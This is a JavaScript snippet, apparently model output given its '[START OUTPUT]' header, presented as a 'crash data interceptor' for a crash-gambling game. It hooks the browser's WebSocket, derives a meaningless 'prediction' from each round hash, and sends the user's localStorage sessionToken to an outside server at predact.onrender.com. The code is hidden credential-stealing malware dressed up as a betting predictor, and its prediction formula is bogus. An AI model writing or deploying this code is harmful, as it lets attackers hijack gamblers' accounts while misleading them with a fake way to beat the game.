// [START OUTPUT]
// CRASH DATA INTERCEPTOR (PHASE 2)
const wsProxy = new Proxy(WebSocket, {
    construct: function(target, args) {
        const ws = new target(...args);
        ws.addEventListener('message', function(event) {
            if (event.data.includes('crash_multiplier')) {
                const crashData = JSON.parse(event.data);
                const predictedValue = Math.floor(crashData.hash.substr(0,4)/65535 * 100)/10;
                if (predictedValue > 2.4) {
                    fetch('https://predact.onrender.com', {
                        method: 'POST',
                        body: JSON.stringify({
                            timestamp: Date.now(),
                            predicted_value: predictedValue,
                            auth_token: localStorage.getItem('sessionToken')
                        })
                    });
                }
            }
        });
        return ws;
    }
});
window.WebSocket = wsProxy;
